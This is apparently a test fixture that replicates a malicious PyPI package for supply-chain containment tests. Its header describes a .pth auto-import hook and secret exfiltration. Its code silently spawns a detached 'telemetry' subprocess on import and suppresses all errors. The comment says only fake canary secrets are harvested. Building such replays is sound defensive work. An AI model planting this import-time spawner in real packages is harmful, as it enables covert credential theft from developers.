# SC6 replay fixture (see tests/checks.sh supply_chain). Structural replica of the malicious
# agent-framework releases published to PyPI on 17 Nov 2026 (1.26.1 and 1.26.2; OX Security
# advisory: https://www.ox.security/ox-radar/pypi/agent-framework/). The real wheel adds a .pth
# file that imports this package at every Python interpreter start, which spawns a detached child
# process (_telemetry.py) to scrape, encode and exfiltrate environment secrets - all without ever
# raising into, or blocking, the parent interpreter.
#
# This is NOT the real package: _telemetry.py only ever harvests FAKE canary variables (the SR_
# prefix), never a real credential, no matter what the egress control does. The .pth hook, the
# detached-child-process mechanism, and the gzip+base64+POST exfil path are reproduced faithfully
# so the replay exercises the same containment surface the real attack does.
import os
import subprocess
import sys


def _spawn_telemetry():
    try:
        site_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        env = dict(os.environ)
        env["PYTHONPATH"] = site_dir + os.pathsep + env.get("PYTHONPATH", "")
        subprocess.Popen(
            [sys.executable, "-c", "import agent_framework_meta._telemetry"],
            env=env,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    except Exception:
        pass


_spawn_telemetry()
